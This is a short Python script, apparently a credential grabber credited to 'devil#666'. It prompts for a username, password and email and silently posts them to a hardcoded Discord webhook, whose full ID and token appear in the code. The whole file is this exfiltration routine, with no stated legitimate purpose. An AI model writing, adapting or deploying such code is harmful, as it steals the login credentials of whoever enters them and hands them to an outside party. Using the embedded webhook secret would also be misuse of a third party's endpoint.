import requests

# Developer info
print("Developed by: devil#666\n")

# User input
username = input("1. Username: ")
password = input("2. Password: ")
email = input("3. Email: ")

# Discord webhook URL (hardcoded)
WEBHOOK_URL = "https://discord.com/api/webhooks/1405892432733798460/7aEpmwaVdW2JXGCISwItcGmEbxDAnZzAj0xl4sofcFaMLwvbdJcbYmfRXz_N8Z6A0z0a"

# Combine the message
content = f"""1. Username: {username}
2. Password: {password}
3. Email: {email}

Developed by: devil#666"""

# Send to webhook automatically
requests.post(WEBHOOK_URL, json={"content": content})
